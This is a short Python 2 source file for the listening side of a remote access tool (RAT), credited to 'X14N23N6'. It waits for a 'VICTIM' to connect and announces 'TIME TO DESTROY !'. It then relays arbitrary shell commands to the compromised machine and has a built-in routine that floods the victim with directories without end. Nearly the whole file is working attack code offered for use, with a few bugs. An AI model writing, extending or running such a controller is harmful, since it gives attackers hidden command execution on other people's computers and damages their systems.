import os,sys
from time import sleep
import random,time

r = "\033[;31m"
g = "\033[;32m"
y = "\033[;33m"
b = "\033[;34m"
e = "\033[;0m"

def n(o):
 for x in o + "\r":
  sys.stdout.write(x)
  sys.stdout.flush()
  time.sleep(random.random() * 0.1)

host = sys.argv[1]
port = int(sys.argv[2])

import socket
import sys
from time import sleep

def bann():
	n(r+"""
    _  _ _ ____ _  _ ___  ____ _  _ ____ 
     \/  | |__| |\ |   /  |___ |\ | | __"""+e+""" 
    _/\_ | |  | | \|  /__ |___ | \| |__] 

  """+g+"""Author : X14N23N6
    
	"""+e)
	
try:	
	n(g+"_______[+]listening To port %s"%(str(port))+e)
	sleep(1)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, port))
	s.listen(5)
	n(g+"_______[+] WAITING TO CONNECT TO VICTIM"+e)
	c, _ = s.accept()
	sleep(1)
	n(y+"_______[+] Connected To Target "+e)
	n(r+"_______[+] TIME TO DESTROY !"+e)
	os.system("clear")
	bann()
except KeyboardInterrupt:
	n(r+"[!] Exiting From Program [!]"+e)
	sys.exit()

sleep(2)
def f():
	while True:
		try:
			hostt = _[0]
			cmd = raw_input(y+"_______"+g+"[+]RAT "+hostt+"~# "+e)
			if cmd[0:5] == "kernel_info":
				c.send("uname -a")
				c.recv(1034)
			elif cmd == "banner":
				os.system("clear")
				bann()
				f()
			elif cmd == "lol":
				an = "abcdefghijklmnopqrstuwxyz1234567890"
				print "     [+] Creating dir .... [+]"
				while True:
					lola = random.choice(an)
					c.send("mkdir "+lola)
					c.recv(1034)
					sleep(0)
			elif cmd == "music":
				mus = raw_input("music name > ")
				c.send("mpv "+mus)
				c.recv(1034)

			else:
				c.send(cmd)
				result = c.recv(1024)
				if result == "bacod":
				 main()
				print g+result+e
		except KeyboardInterrupt:
			n(r+"_______[!] ShutDown From The Target"+e)
			sys.exit()
		except IOError:
			n(r+"_______[!] Exiting From Program"+e)
			sys.exit()
		except socket.error:
			n(r+"_______[!] Disconnected from target..."+e)
			sys.exit()
				
if __name__ == "__main__":
	f()